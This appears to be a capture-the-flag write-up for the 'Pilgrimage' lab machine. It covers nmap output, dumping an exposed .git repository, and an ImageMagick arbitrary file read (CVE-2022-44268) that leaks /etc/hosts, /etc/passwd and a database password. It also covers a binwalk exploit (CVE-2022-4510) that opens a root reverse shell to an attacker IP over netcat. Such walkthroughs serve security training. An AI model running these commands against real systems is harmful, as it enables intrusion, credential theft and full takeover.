\chapter{Pilgrimage}
\begin{itemize}
    \item {\bf technics}: git, imagemagick, binwalk
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{nmap}
\begin{verbatim}
$ nmapz 10.10.11.219
TCP ports found: 22,80
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-10 02:45 CEST
Nmap scan report for pilgrimage.htb (10.10.11.219)
Host is up (0.052s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: nginx/1.18.0
| http-git:
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
|_http-title: Pilgrimage - Shrink Your Images
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
\end{verbatim}

\section{git}

\begin{verbatim}
$ curl -i http://pilgrimage.htb/.git/config
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Mon, 10 Jul 2023 00:48:17 GMT
Content-Type: application/octet-stream
Content-Length: 92
Last-Modified: Wed, 07 Jun 2023 10:09:42 GMT
Connection: keep-alive
ETag: "64805766-5c"
Accept-Ranges: bytes

[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true

\end{verbatim}

\begin{verbatim}
$ git-dumper http://pilgrimage.htb/.git evidence/findings/git
[-] Testing http://pilgrimage.htb/.git/HEAD [200]
[-] Testing http://pilgrimage.htb/.git/ [403]
[-] Fetching common files

\end{verbatim}


\section{PHP - magick}

path traversal:
\begin{verbatim}
$ grep -rn --include "*.php" -e "^\(.*\s\|\)\(readfile\|file_get_contents\|stream_get_contents\|show_source\|fopen\|file\|fpassthru\|gzopen\|gzfile\|gzpassthru\|readgzfile\)\(\s\|(\).*\\$" --color
assets/bulletproof.php:141:        $this->error = sprintf('No file input found with name: (%s)', $offset);
\end{verbatim}

include:
\begin{verbatim}
$ grep -rn --include "*.php" -e "^\(.*\s\|\)\(include\|require\|virtual\|require_once\|include_once\)\(\s\|(\).*\\$" --color
\end{verbatim}

exec:
\begin{verbatim}
$ grep -rn --include "*.php" -e "^\(.*\s\|\)\(eval\|popen\|pcntl_exec\|assert\|proc_open\|create_function\|call_user_func\|call_user_func_array\|exec\|shell_exec\|system\|passthru\|virtual\)([^)]*\\$" --color
index.php:27:      exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);
\end{verbatim}

\begin{verbatim}
$ ./magick -version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5)
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
\end{verbatim}

CVE-2022-44268:
\begin{itemize}
    \item url{https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC}
\end{itemize}


\begin{verbatim}
$ pngcrush -text a "profile" "/etc/hosts" WalkTheDog.png
Warning: versions are different between png.h and png.c
  png.h version: 1.6.37
  png.c version: 1.6.40

  Recompressing IDAT chunks in WalkTheDog.png to pngout.png
   Total length of data found in critical chunks            =   3123461
   Best pngcrush method        =   7 (ws 15 fm 0 zl 9 zs 0) =   2614304
CPU time decode 0.222435, encode 2.549160, other 0.005135, total 2.780693 sec

$ exiv2 -pS pngout.png
STRUCTURE OF PNG FILE: pngout.png
 address | chunk |  length | data                           | checksum
       8 | IHDR  |      13 | .......8....                   | 0xe8d3c143
      33 | bKGD  |       6 | ......                         | 0xa0bda793
      51 | pHYs  |       9 | ...#...#.                      | 0x78a53f76
      72 | tIME  |       7 | .......                        | 0xe10e66b0
      91 | IDAT  |  524288 | x...w.,......z.p......F.... .S | 0xa4b66edd
  524391 | IDAT  |  524288 | .. d......aP......@........l.. | 0x52ee9f08
 1048691 | IDAT  |  524288 | .......^.I....P.>..K..^.x.n... | 0x9e0fe3ab
 1572991 | IDAT  |  524288 | v.......].....X.K.o*....I...2. | 0x07431251
 2097291 | IDAT  |  517047 | ..x>.....h7.....\..@.O~..;..my | 0xb37cd5c5
 2614350 | tEXt  |      18 | profile./etc/hosts             | 0xc560a843
 2614380 | IEND  |       0 |                                | 0xae426082

 $ identify -verbose 64ab5b5b4514c.png
Image:
  Filename: 64ab5b5b4514c.png
  Permissions: rw-r-----
  Format: PNG (Portable Network Graphics)
...SNIP...
     205
3132372e302e302e31096c6f63616c686f73740a3132372e302e312e310970696c677269
6d6167652070696c6772696d6167652e6874620a0a232054686520666f6c6c6f77696e67
206c696e65732061726520646573697261626c6520666f7220495076362063617061626c
6520686f7374730a3a3a3120202020206c6f63616c686f7374206970362d6c6f63616c68
6f7374206970362d6c6f6f706261636b0a666630323a3a31206970362d616c6c6e6f6465
730a666630323a3a32206970362d616c6c726f75746572730a
...SNIP...
  Version: ImageMagick 7.1.1-12 Q16-HDRI x86_64 21239 https://imagemagick.org


$ python -c "print(bytes.fromhex(open('./test','r').read()).decode())"
127.0.0.1       localhost
127.0.1.1       pilgrimage pilgrimage.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
\end{verbatim}


\url{https://gchq.github.io/CyberChef/}

passwd:
\begin{verbatim}
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false

\end{verbatim}


\verb+var/db/pilgrimage+:
\begin{verbatim}
$ sqlite3 download.sqlite
SQLite version 3.42.0 2023-05-16 12:36:15
Enter ".help" for usage hints.
sqlite> .databases
main: /home/jubeaz/documents/pentesting-games/htb/pilgrimage/evidence/findings/download.sqlite r/w
sqlite> .fullschema
CREATE TABLE users (username TEXT PRIMARY KEY NOT NULL, password TEXT NOT NULL);
CREATE TABLE images (url TEXT PRIMARY KEY NOT NULL, original TEXT NOT NULL, username TEXT NOT NULL);
/* No STAT tables available */
sqlite> select * from users;
emily|abigchonkyboi123
test|test

\end{verbatim}

\section{emily/abigchonkyboi123}
\begin{verbatim}
$ ssh emily@pilgrimage.htb
The authenticity of host 'pilgrimage.htb (10.10.11.219)' can't be established.
emily@pilgrimage:~$

\end{verbatim}


pspy:
\begin{verbatim}
2023/07/10 11:44:26 CMD: UID=0     PID=685    | /bin/bash /usr/sbin/malwarescan.sh
2023/07/10 11:44:26 CMD: UID=0     PID=684    | /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/
\end{verbatim}


\begin{verbatim}
$ cat /usr/sbin/malwarescan.sh
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done

\end{verbatim}

\begin{verbatim}
$ binwalk -h

Binwalk v2.3.2

\end{verbatim}

\href{https://github.com/electr0sm0g/CVE-2022-4510/blob/main/RCE_Binwalk.py}{CVE-2022-4510}

\begin{verbatim}
 python RCE_Binwalk.py WalkTheDog.png 10.10.16.2 4444

################################################
------------------CVE-2022-4510----------------
################################################
--------Binwalk Remote Command Execution--------
------Binwalk 2.1.2b through 2.3.2 included-----
------------------------------------------------
################################################
----------Exploit by: Etienne Lacoche-----------
---------Contact Twitter: @electr0sm0g----------
------------------Discovered by:----------------
---------Q. Kaiser, ONEKEY Research Lab---------
---------Exploit tested on debian 11------------
################################################


You can now rename and share binwalk_exploit and start your local netcat listener.



emily@pilgrimage:~$ cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/

$ nc -lnvp 4444
Connection from 10.10.11.219:59674
ls
_binwalk_exploit.png.extracted
ls
_binwalk_exploit.png.extracted
pwd
/root/quarantine

id
uid=0(root) gid=0(root) groups=0(root)

\end{verbatim}

